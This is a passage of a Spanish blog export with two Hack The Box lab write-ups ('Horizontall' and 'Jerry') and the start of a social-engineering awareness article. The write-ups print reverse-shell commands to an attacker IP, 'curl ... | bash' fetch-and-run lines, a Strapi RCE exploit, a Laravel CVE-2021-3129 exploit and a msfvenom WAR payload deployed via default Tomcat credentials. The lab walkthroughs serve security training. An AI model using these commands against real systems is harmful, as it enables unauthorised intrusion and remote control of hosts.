<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-47-17.png" alt="Hackforce-2022-12-11-23-47-17.png" /></p>

<p>Vemos un CMS llamado strapi.</p>

<p>Buscamos con searchsploit una posible vulnerabilidad.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit  strapi
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-49-24.png" alt="Hackforce-2022-12-11-23-49-24.png" /></p>

<p>Vemos 3 vulnerabilidades encontradas.</p>

<p>Vamos a verlo por consola la url que vimos anteriormente <a href="http://api-prod.horizontall.htb/reviews">http://api-prod.horizontall.htb/reviews</a></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s2">"http://api-prod.horizontall.htb/reviews"</span> | jq
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-53-10.png" alt="Hackforce-2022-12-11-23-53-10.png" /></p>

<p>Vemos posibles usuarios pero nada mas así que volveremos a hacer fuzzing con wfuzz.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-t</span> 200 <span class="nt">--hc</span><span class="o">=</span>404,200 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="s2">"http://api-prod.horizontall.htb/FUZZ"</span>
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-06-57.png" alt="Hackforce-2022-12-12-00-06-57.png" /></p>

<p>Vemos por ahi un par de cosas interesantes por ejem visitaremos la ruta de admin a ver que hay.</p>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-08-30.png" alt="Hackforce-2022-12-12-00-08-30.png" /></p>

<p>Vemos un panel de autenticacion pero no disponemos de credenciales, antes probamos buscar las de default a ver si logramos entrar.</p>

<p>Ahora haremos Fuzzing de nuevo a esta ruta <a href="http://api-prod.horizontall.htb/admin/">http://api-prod.horizontall.htb/admin/</a></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hh</span><span class="o">=</span>854 <span class="nt">-t</span> 200 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="s2">"http://api-prod.horizontall.htb/admin/FUZZ"</span>
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-43-41.png" alt="Hackforce-2022-12-12-00-43-41.png" /></p>

<p>Miramos un par de directorios interesantes.</p>

<p>Al visitar el directorio Init podemos contemplar la version de Strapi y si buscamos con searchsploit como lo hicimos anteriormente miraremos que es vulnerable.</p>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-49-13.png" alt="Hackforce-2022-12-12-00-49-13.png" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit strapi
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-51-06.png" alt="Hackforce-2022-12-12-00-51-06.png" /></p>

<h1 id="explotación">Explotación</h1>

<p>Nos dirigimos a la carpeta exploit de nuestros directorios de trabajo y nos copiamos el que dice remote code execution (Unauthenticated).</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit <span class="nt">-m</span> multiple/webapps/50239.py
</code></pre></div></div>

<p>Lo renombramos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mv </span>50239.py rce_strapi.py
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-57-51.png" alt="Hackforce-2022-12-12-00-57-51.png" /></p>

<p>Ejecutamos el exploit para ver que nos pide.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 rce_strapi.py
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-59-28.png" alt="Hackforce-2022-12-12-00-59-28.png" /></p>

<p>Como vemos solo nos pide la url.</p>

<p>Le pasamos la URL.</p>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-03-33.png" alt="Hackforce-2022-12-12-01-03-33.png" /></p>

<p>Y como podemos ver nos funciono el exploit.</p>

<p>Ahora probaremos entablarnos una reverse shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-e</span> /bin/bash 10.10.14.7 443
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-10-06.png" alt="Hackforce-2022-12-12-01-10-06.png" /></p>

<p>Vemos que no al parecer no nos interpreta, hacemos un par de pruebas mas.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /de/tcp/10.10.14.7/443 0&gt;&amp;1
bash <span class="nt">-c</span> <span class="s2">"bash -i &gt;&amp; /de/tcp/10.10.14.7/443 0&gt;&amp;1"</span>
bash <span class="nt">-c</span> bash <span class="nt">-i</span> <span class="o">&gt;</span>%26 /de/tcp/10.10.14.7/443 0&gt;%261<span class="s2">"
</span></code></pre></div></div>

<p>Probamos con cada una y vemos que no funciona entonces verificamos que la maquina tenga curl.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Curl http://10.10.14.7/test
</code></pre></div></div>

<p>Y también nos montamos el servidor con python en nuestra maquina.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-16-05.png" alt="Hackforce-2022-12-12-01-16-05.png" /></p>

<p>Y vemos que si tiene curl instalado la maquina victima.</p>

<p>Lo que haremos sera crearnos un archivo index.html con el siguiente contenido.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nvim index.html
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-43-37.png" alt="Hackforce-2022-12-12-01-43-37.png" /></p>

<p>Nos montamos el servidor con python para compartirnos el recurso index.html.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>

<p>Ahora hacemos un curl al recurso que compartimos, veremos que nos muestra el código del index.html si lo pipeamos con bash nos va a interpretar el código, antes de lanzarle el curl nos ponemos en escucha con netcat.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.10.14.7/index.html | bash
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-45-04.png" alt="Hackforce-2022-12-12-01-45-04.png" /></p>

<p>Una vez lanzado el curl podemos ver que hemos obtenido una reverse shell.</p>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-49-08.png" alt="Hackforce-2022-12-12-01-49-08.png" /></p>

<p>Hacemos un locate del user.txt</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>locate user.txt
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-57-41.png" alt="Hackforce-2022-12-12-01-57-41.png" /></p>

<p>Vemos donde esta la flag y hacemos un cat para ver si logramos visualizarla.</p>

<p><img src="/assets/images/htb-writeup-horizontall/user.png" alt="Hackforce-2022-12-12-01-58-44.png" /></p>

<p>En efecto visualizamos la flag con eso ya tendríamos la maquina ahora nos falta convertirnos en root.</p>

<p>Antes de escalar priveligios haremos el tratamiento de la TTY.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script /dev/null <span class="nt">-c</span> bash
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-14-16.png" alt="Hackforce-2022-12-12-02-14-16.png" /></p>

<p>ctrl + z y continuamos con el tratamiento.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg
</span>reset
xterm
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-16-30.png" alt="Hackforce-2022-12-12-02-16-30.png" /></p>

<p>Continuamos</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash
ssty rows 37 columns 183
</code></pre></div></div>

<p>En el caso de el size de la stty tienen que colocar la de las proporciones de su ventana y ya con esto tendriamos total movilidad en la shell.</p>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-20-33.png" alt="Hackforce-2022-12-12-02-20-33.png" /></p>

<p>Ahora si pasamos a la escalada.</p>

<h1 id="escalada-de-privilegios">Escalada de Privilegios</h1>

<p>Lo primero que haremos sera buscar por permisos SUID nos dirigimos a la raiz y ejecutamos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-28-37.png" alt="Hackforce-2022-12-12-02-28-37.png" /></p>

<p>No vemos nada interesante para escalar.</p>

<p>Luego listamos por tareas cron.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/crontab
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-29-51.png" alt="Hackforce-2022-12-12-02-29-51.png" /></p>

<p>No vemos ninguna tarea cron.</p>

<p>Listamos puertos que estén abiertos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netstat <span class="nt">-nat</span>
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-31-39.png" alt="Hackforce-2022-12-12-02-31-39.png" /></p>

<p>Vemos por ahi uno interesante.</p>

<p>lanzamos un curl al puerto 8000 para ver que hay.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl localhost:8000
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-32-56.png" alt="Hackforce-2022-12-12-02-32-56.png" /></p>

<p>Vemos que hay una pagina web con laravel.</p>

<p>Utilizaremos chisel para jugar con port forwarding. Nos dirigimos a github y nos clonamos el repositorio en exploits.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/jpillora/chisel.git
</code></pre></div></div>

<p>Nos metemos en chisel y compilamos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>go build <span class="nt">-ldflags</span> <span class="s2">"-s -w"</span> <span class="nb">.</span>
</code></pre></div></div>

<p>Ahora con UPX vamos a reducir mas el peso de chisel</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upx chisel
</code></pre></div></div>

<p>Una vez hecho esto nos transferiremos el chisel a la maquina victima. En nuestra maquina colocamos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>

<p>Y en la maquina victima nos dirigimos al directorio tmp y nos bajamos el chisel.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://10.10.14.7/chisel
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-45-39.png" alt="Hackforce-2022-12-12-02-45-39.png" /></p>

<p>Luego le damos permisos de ejecución chmod + x chisel.</p>

<p>Ahora para utilizar chisel vamos a montarnos un servidor en nuestra maquina por el puerto que queramos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./chisel server <span class="nt">--reverse</span> <span class="nt">-p</span> 1234
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-55-21.png" alt="Hackforce-2022-12-12-02-55-21.png" /></p>

<p>Ahora ejecutamos el chisel en la maquina victima para hacer el port forwarding.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./chisel client 10.10.14.7:1234 R:8000:127.0.0.1:8000
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-03-04-25.png" alt="Hackforce-2022-12-12-03-04-25.png" /></p>

<p>Con esto ya estaría listo el port forwarding, y lo verificamos visitando el <a href="http://localhost">localhost</a> en el puerto indicado.</p>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-03-05-39.png" alt="Hackforce-2022-12-12-03-05-39.png" /></p>

<p>Listo ya podemos visualizar la pagina de laravel en nuestra maquina.</p>

<p>Buscamos en github un exploit para esa version de laravel y nos clonamos el repositorio en exploits.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/nth347/CVE-2021-3129_exploit.git
</code></pre></div></div>

<p>Nos metemos al directorio y ejecutamos el script de python.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 <span class="nb">whoami</span>
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-03-32-43.png" alt="Hackforce-2022-12-12-03-32-43.png" /></p>

<p>Listo nos funciono ahora solo nos faltaria ejecutarnos una reverse shell para acceder como root y visualizar la flag.</p>

<p>Como ya tenemos una via potencial para mandarnos la reverse shell con el index.html que habiamos creado lo copiamos a este directorio.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> ../index.html <span class="nb">.</span>
</code></pre></div></div>

<p>Luego montamos el servidor con python nuevamente.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>

<p>Nos ponemos en escucha con netcat.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp443</span>
</code></pre></div></div>

<p>Y por ultimo ejecutamos el exploit.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 <span class="s1">'curl 10.10.14.7 | bash'</span>
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-03-44-27.png" alt="Hackforce-2022-12-12-03-44-27.png" /></p>

<p>Listo con esto nos convertimos en root y podemos visualizar la flag.</p>

<p>Visualizamos la flag.</p>

<p><img src="/assets/images/htb-writeup-horizontall/root.png" alt="Hackforce-2022-12-12-03-49-05.png" /></p>

<p>Listo con esto tendríamos hecha la maquina por completo, happy hacking.</p>]]></content><author><name>ewor01</name></author><category term="hackthebox" /><category term="eJTP" /><category term="eWPT" /><category term="Fácil" /><category term="Linux" /><category term="Information Leakage" /><category term="Port Forwarding" /><category term="Strapi CMS Exploitation" /><category term="Laravel Exploitation" /><summary type="html"><![CDATA[Horizontall es una maquina donde estaremos explotando una vulnerabilidad en un gestor de contenido llamado Strapi, luego tendremos que hacer port forwarding para poder llegar a la maquina y posteriormente lograr comprometerla gracias a una vulnerabilidad en Laravel.]]></summary></entry><entry><title type="html">Jerry - Hack The Box</title><link href="http://localhost:4000/jerry-hackthebox/" rel="alternate" type="text/html" title="Jerry - Hack The Box" /><published>2023-01-29T00:00:00-06:00</published><updated>2023-01-29T00:00:00-06:00</updated><id>http://localhost:4000/jerry-hackthebox</id><content type="html" xml:base="http://localhost:4000/jerry-hackthebox/"><![CDATA[<p><img src="/assets/images/htb-writeup-jerry/Jerry.png" alt="Jerry.png" /></p>

<p>Certificaciones a aplicar: eJPT</p>

<p>Dificultad: Fácil</p>

<p>Habilidades:</p>

<ul>
  <li>Information Leakage</li>
  <li>Abusing Tomcat [Intrusion &amp; Privilege Escalation]</li>
</ul>

<h1 id="ip-de-la-maquina">IP de la Maquina</h1>

<p>10.10.10.95</p>

<h1 id="reconocimiento">Reconocimiento</h1>

<p>Identificando el sistema operativo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whichSystem.py 10.10.10.95
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-18-37-24.png" alt="Hackforce-2022-12-18-18-37-24.png" /></p>

<p>Escaneo de los puertos y guardamos en formato grep en el ficherito allPorts.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.95 <span class="nt">-oG</span> allPorts
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-18-48-57.png" alt="Hackforce-2022-12-18-18-48-57.png" /></p>

<p>Función extractPorts.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>extractPorts allPorts
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-18-49-49.png" alt="Hackforce-2022-12-18-18-49-49.png" /></p>

<h1 id="análisis-de-vulnerabilidades">Análisis de Vulnerabilidades</h1>

<p>Buscando versiones y servicios que corren para esos puertos y lo guardamos en formato nmap en el ficherito targeted.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span> 10.10.10.95 <span class="nt">-oN</span> targeted
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-00-49.png" alt="Hackforce-2022-12-18-19-00-49.png" /></p>

<p>Vemos que estamos ante un apache tomcat y nos muestra la version.</p>

<p>Vamos a identificar ante que nos estamos enfrentando de la siguiente manera colocamos en el navegador launchpad 4ubuntu0.5 y nos dara el siguiente resultado.</p>

<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-11-18-07-31.png" alt="Hackforce-2022-12-11-18-07-31.png" /></p>

<p>De esta manera vemos que estamos ante un Ubuntu Bionic.</p>

<p>Vamos a verificar con whatweb  y a ver que nos reporta la herramienta.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://10.10.10.95:8080
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-03-36.png" alt="Hackforce-2022-12-18-19-03-36.png" /></p>

<p>Vemos poco solo que estamos ante un Tomcat de version 7.0.88.</p>

<p>con whatweb y el parámetro -v nos mostrara un poco mas de información y de manera mas ordenada.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://10.10.10.95:8080 <span class="nt">-v</span>

</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-14-20.png" alt="Hackforce-2022-12-18-19-14-20.png" /></p>

<p>Igual no logramos ver nada en concreto a si que vamos a proceder a inspeccionar la web.</p>

<p>Vemos que es un panel de tomcat.</p>

<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-40-55.png" alt="Hackforce-2022-12-18-19-40-55.png" /></p>

<p>Vamos a probar una ruta que suele venir siempre cuando hay un tomcat.</p>

<p>10.10.10.95:8080/manager/html.</p>

<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-43-27.png" alt="Hackforce-2022-12-18-19-43-27.png" /></p>

<p>Vemos que nos solicita credenciales para acceder.</p>

<p>Como no disponemos de credenciales, lo habitual es probar las que vienen por default en la aplicación.</p>

<p>Si ingresamos las credenciales que vienen por default nos mostrara lo siguiente.</p>

<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-47-53.png" alt="Hackforce-2022-12-18-19-47-53.png" /></p>

<p>Si leemos detenidamente lo que nos dice, veremos que pone como se deberia configurar las credenciales de acceso y vemos 2 campos interesantes, username y password.</p>

<p>Colocamos las credenciales que encontramos al ver el archivo anterior y probamos.</p>

<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-51-20.png" alt="Hackforce-2022-12-18-19-51-20.png" /></p>

<p>Como vemos hemos podido ingresar, ahora observaremos detenidamente que podemos hacer.</p>

<p>Vemos que podemos subir nuestro propio archivo war.</p>

<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-53-30.png" alt="Hackforce-2022-12-18-19-53-30.png" /></p>

<p>Lo que trataremos de hacer sera subir un war malicioso para que lo podamos ejecutar desde el panel de aplicaciones.</p>

<h1 id="explotación">Explotación</h1>

<p>Vamos a generar un war malicioso con msfvenom.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-l</span> payloads | <span class="nb">grep </span>java
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-04-18.png" alt="Hackforce-2022-12-18-20-04-18.png" /></p>

<p>Con este comando listamos los payloads disponibles en java, porque este nos permitirá generar el war malicioso. En este caso el que nos interesa es el que pone java/jsp_shell_reverse_tcp para entablarnos una conexión inversa en la maquina victima.</p>

<p>Luego nos dirigimos al directorio content y creamos el payload con msfvenom.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.4 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> war <span class="nt">-o</span> shell.war
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-16-25.png" alt="Hackforce-2022-12-18-20-16-25.png" /></p>

<p>Listo ahi tendríamos nuestro war malicioso creado.</p>

<p>Ahora nos movemos el war malicioso a nuestro directorio de descargas y lo subimos a tomcat.</p>

<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-20-37.png" alt="Hackforce-2022-12-18-20-20-37.png" /></p>

<p>Así se miraría nuestro war malicioso en el servidor.</p>

<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-22-55.png" alt="Hackforce-2022-12-18-20-22-55.png" /></p>

<p>Ahora nos ponemos en escucha con netcat y ejecutamos el war malicioso.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap nc <span class="nt">-nlvp</span> 443
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-25-47.png" alt="Hackforce-2022-12-18-20-25-47.png" /></p>

<p>Con esto deberíamos ganar acceso a la maquina y estaríamos como nt authority system.</p>

<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-29-47.png" alt="Hackforce-2022-12-18-20-29-47.png" /></p>

<p>Procedemos a buscar las flags y listo con esto terminaríamos la maquina.</p>

<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-41-30.png" alt="Hackforce-2022-12-18-20-41-30.png" /></p>

<p>Ahi podemos visualizar las flags, que como vemos nos dan la de user y root.</p>

<h1 id="escalada-de-privilegios">Escalada de Privilegios</h1>

<p>En este caso la vulnerabilidad explotada nos brinda los privilegios máximos como NT authority System y podemos hacer cualquier cosa por lo que no hay que elevar privilegios.</p>

<p>Listo con esto tendríamos hecha la maquina por completo, happy hacking.</p>

<p>Les dejo la resolución de la misma por s4vitar <a href="https://www.youtube.com/watch?v=bB-M5vPegMk">Ver video</a></p>]]></content><author><name>ewor01</name></author><category term="hackthebox" /><category term="eJTP" /><category term="Fácil" /><category term="Windows" /><category term="Information Leakage" /><category term="Tomcat" /><summary type="html"><![CDATA[Jerry es una maquina donde estaremos explotando una vulnerabilidad en Tomcat, en el cual comprometeremos la maquina mediante un archivo war malicioso.]]></summary></entry><entry><title type="html">Ingeniería social y cómo protegerse</title><link href="http://localhost:4000/ingenier%C3%ADa-social/" rel="alternate" type="text/html" title="Ingeniería social y cómo protegerse" /><published>2023-01-16T00:00:00-06:00</published><updated>2023-01-16T00:00:00-06:00</updated><id>http://localhost:4000/ingenier%C3%ADa-social</id><content type="html" xml:base="http://localhost:4000/ingenier%C3%ADa-social/"><![CDATA[<p align="center">
<img src="/assets/images/ingeniería-social/ingeniería-social2.jpg" />
</p>

<h2 id="ingeniería-social-y-cómo-protegerse">Ingeniería social y cómo protegerse</h2>

<p>La ingeniería social consiste en aquellas técnicas que permitan manipular a una persona para lograr que esta proporcione información relevante o lleve a cabo una acción propuesta por el atacante.</p>

<p>Es muy importante aprender sobre la ingeniería social ya que es uno de los ataques más utilizados por los cibercriminales hoy en día y por esta razón es que necesitamos capacitarnos, para poder identificar este tipo de ataques y tener más segura nuestra información y la de las empresas.</p>

<p align="center">
<img src="/assets/images/ingeniería-social/ingeniería-social.jpg" />
</p>

<p>Vamos a mencionar algo muy interesante:</p>

<p>En cualquier cadena de seguridad, los humanos somos casi siempre el eslabón más débil, porque somos susceptibles de todo tipo de tácticas de manipulación.</p>

<p>Como lo dice aqui arriba nosotros los humanos siempre vamos a ser la parte más débil de una empresa, por el simple hecho de que si no tenemos el concocimiento necesario podemos llegar a poner en riesgo a una empresa o nuestra información, ya que nosotros no poseemos un antivirus que nos indique que estamos ante un ataque de este tipo, tampoco poseemos actualizaciones etc.</p>

<p>La mejor defensa ante este tipo de ataques es capacitarnos constantemente en temas de ciberseguridad.</p>

<p>Un software puede ser muy seguro, pero si no poseemos el conocimiento necesario sobre este tipo de ataques es muy probable que ese software sea vulnerado por nuestra culpa.</p>

<p align="center">

<img src="/assets/images/ingeniería-social/manipulados.jpg" />
</p>

<p>Hay muchos ataques de ingeniería social, pero solo miraremos algunos:</p>

<ul>
  <li>Phishing</li>
  <li>Vishing</li>
  <li>Baiting</li>
  <li>Adicionales (redes sociales, sms, etc.)</li>
</ul>

<p align="center">
<img src="/assets/images/ingeniería-social/tipos-ataques.jpg" />
</p>

<p>Phishing:</p>

<p>Envió de correos suplantando una determinada persona o la suplantación de aplicaciones web. Por lo general este tipo de ataque es uno de los más utilizados a día de hoy.</p>

<p align="center">
<img src="/assets/images/ingeniería-social/phishing.jpg" />
</p>

<p>Vishing:</p>

<p>Donde el atacante suplanta la identidad de una empresa o de una persona de confianza, con el fin de obtener información personal de sus víctimas. Es lo mismo que el ataque anterior, solo que este es mediante una llamada telefónica.</p>

<p align="center">
<img src="/assets/images/ingeniería-social/vishing.jpg" />
</p>

<p>Baiting:</p>

<p>Es el caso en el que un atacante deja un dispositivo infectado con malware (por ejemplo, una unidad USB) en algún lugar fácil de encontrar. Esto lo hacen por lo general con etiquetas llamativas, como documentos confidenciales, fotos nopor, y cosas que a las personas les de curiosidad y vayan corriendo a conectarlas a sus computadoras (nunca hagan eso).</p>

<p align="center">
<img src="/assets/images/ingeniería-social/baiting.jpeg" />
</p>

<p>Adicionales:</p>

<p>Técnicas de ingeniería social mediante redes sociales, mensajes de texto, etc. Ahora utilizan estos mismos ataques pero haciendo uso de las diferentes redes sociales que existen. En instagram por ejemplo es donde las personas pierden sus cuentas con bastante frecuencia y todo por hacer clic en enlaces que las envian amigos a los cuales ya les comprometieron esas cuentas, o simplemente porque ven un mensaje que dice que cerraran sus cuentas y no esto no es asi, lo unico que hacen al realizar estas acciones es caer en el juego de los ciberdelincuentes.</p>

<p>Igual realizan las mismas técnicas pero mediante mensajes de texto, haciendose pasar por bancos, o servicios muy conocidos y que son utilizados por casi todas las personas, con el mismo fin de robarse nuestros datos.</p>

<p align="center">
<img src="/assets/images/ingeniería-social/redessociales.jpg" />
</p>

<p>Ejemplos de ataques de ingeniería social a grandes Empresas.</p>

<p>Tomaremos como ejemplo solo 2 empresas:</p>

<ul>
  <li>RSA</li>
  <li>Microsoft</li>
</ul>

<p>Miraremos cual fue la metodología que utilizaron los ciberdelincuentse para infiltrarse en estas empresas y obtener la información.</p>

<p align="center">
<img src="/assets/images/ingeniería-social/ingenieriasocialempresas.jpg" />
</p>

<p>RSA:</p>

<ul>
  <li>Suplantación y envió de correo.</li>
  <li>Documento adjunto de Excel.</li>
  <li>Uso de datos ’verídicos’ de planilla.</li>
  <li>Explotación de vulnerabilidad en flash.</li>
  <li>Compromiso de sistema interno.</li>
</ul>

<p>Como podemos observar primero lograron entrar mediante un <code class="language-plaintext highlighter-rouge">phishing</code>, utilizaron un documento de Excel que contenía código malicioso, el cual al ejecutarse explotaba una vulnerabilidad de flash que había en aquel entonces, y así lograron llegar hasta los sistemas internos de la empresa. Aquí es donde miramos la importancia de que el personal y tanto nosotros mismos estemos muy bien capacitados en todos estos temas para poder evitar este tipo de ataques.</p>

<p align="center">
<img src="/assets/images/ingeniería-social/rsa.png" />
</p>

<p>Microsoft:</p>

<ul>
  <li>Llamada telefónica.</li>
  <li>Obtención de números de seguridad social de empleados.</li>
  <li>Reutilización en proveedores para el acceso a cuentas.</li>
  <li>Obtención de información sensible sobre XBOX.</li>
</ul>

